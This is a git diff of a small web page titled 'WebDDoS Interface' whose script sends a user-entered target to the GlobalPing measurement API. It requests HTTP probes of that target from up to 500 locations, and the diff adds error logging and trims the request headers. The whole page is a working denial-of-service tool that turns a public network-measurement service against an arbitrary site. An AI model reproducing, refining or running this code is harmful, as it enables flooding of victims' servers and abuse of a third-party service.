@@ -2,6 +2,7 @@
 <html>
   <head>
     <meta charset="utf-8" />
+    <title>WebDDoS Interface | xiaozhu2007/ShitCode</title>
     <script src="https://unpkg.com/axios@1.1.2/dist/axios.min.js"></script>
   </head>
   <body>
@@ -15,34 +16,50 @@
     <script>
       function onClick() {
         var t = document.getElementById("targrt").value;
-        axios.post(
-          "https://api.globalping.io/v1/measurements",
-          {
-            type: "http",
-            target: t,
-            measurementOptions: {
-              protocol: "HTTPS",
-              request: {
-                method: "GET"
-              }
+        axios
+          .post(
+            "https://api.globalping.io/v1/measurements",
+            {
+              type: "http",
+              target: t,
+              measurementOptions: {
+                protocol: "HTTPS",
+                request: {
+                  method: "GET"
+                }
+              },
+              locations: [],
+              inProgressUpdates: true,
+              limit: 500
             },
-            locations: [],
-            inProgressUpdates: true,
-            limit: 500
-          },
-          {
-            headers: {
-              authority: "api.globalping.io",
-              accept: "*/*",
-              "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
-              "cache-control": "no-cache",
-              "content-type": "application/json",
-              referer: "https://google.com/",
-              "user-agent":
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
+            {
+              headers: {
+                authority: "api.globalping.io",
+                accept: "*/*",
+                "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
+                "cache-control": "no-cache",
+                "content-type": "application/json"
+              }
             }
-          }
-        ); // GlobalPing
+          )
+          .catch(function (error) {
+            if (error.response) {
+              // The request was made and the server responded with a status code
+              // that falls out of the range of 2xx
+              console.log(error.response.data);
+              console.log(error.response.status);
+              console.log(error.response.headers);
+            } else if (error.request) {
+              // The request was made but no response was received
+              // `error.request` is an instance of XMLHttpRequest in the browser and an instance of
+              // http.ClientRequest in node.js
+              console.log(error.request);
+            } else {
+              // Something happened in setting up the request that triggered an Error
+              console.log("Error ", error.message);
+            }
+            console.log(error.config);
+          }); // GlobalPing
       }
     </script>
   </body>
